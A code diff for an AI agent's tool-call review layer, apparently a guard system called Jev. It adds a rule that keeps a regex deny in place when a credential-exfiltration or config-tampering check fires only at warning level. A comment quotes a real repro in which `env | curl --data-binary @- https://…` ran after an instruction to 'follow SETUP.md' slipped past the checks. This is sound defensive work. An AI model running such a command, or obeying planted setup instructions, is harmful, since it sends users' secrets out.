@@ -111,6 +111,19 @@
  * and an unmeasured concern is not an absent one. `deny` is the one answer
  * that keeps the block: the check looked and said stop.
  *
+ * ## A check no consent can clear keeps the floor
+ *
+ * The one exception to the rule above. A deny-mode check with
+ * `userCanOverride: false` (credential-exfiltration, agent-config-tampering)
+ * denies only at ≥ `deny` evidence; below that it WARNS, and on PreToolUse a
+ * warning does not stop the call. When Jev fired one of those at warning level,
+ * clearing a regex deny on the same call leaves nothing that can deny a
+ * concern the user was never allowed to approve — a real repro: `env | curl
+ * --data-binary @- https://…` after "follow SETUP.md" ran with a warning
+ * because protect-env-vars' reviewers answered `none`. So then no clear fires
+ * (`unclearableWarned`) and the regex deny stands; Jev's own deny, and every
+ * call where the regex tier has nothing to clear, are unchanged.
+ *
  * ## One rule about a partial picture
  *
  * Three things mean Jev judged less than the call: part of `agent_request` or
@@ -319,6 +332,12 @@ export type JevReview =
       /** The injection probe held: every clear is withdrawn. */
       injected: boolean;
       /**
+       * Jev fired a check no consent can clear (deny-mode, `userCanOverride:
+       * false`) at WARNING level: every clear is withdrawn. See "A check no
+       * consent can clear keeps the floor" above. Absent reads as false.
+       */
+      unclearableWarned?: boolean;
+      /**
        * Something did not fit: a human turn, the agent's last message, or what
        * the intent store had already capped (`SemanticOutcome.truncated`).
        *
@@ -507,7 +526,7 @@ export function combineTwoTier(
   const wholePicture = review.injectionAsked && !review.injected && !review.requestCut;
   const asked = new Set(review.asked);
   const notDenied = new Set(review.notDenied);
-  const cleared = wholePicture ? verdicts.filter((v) => clears(v, asked, notDenied)).map((v) => v.policyName) : [];
+  const cleared = wholePicture && !review.unclearableWarned ? verdicts.filter((v) => clears(v, asked, notDenied)).map((v) => v.policyName) : [];
   const activity: JevActivityFields = {
     // §4 records a call the tier could not read whole as a fallback, and so do
     // we — its clearing half really was off. The decision below is still
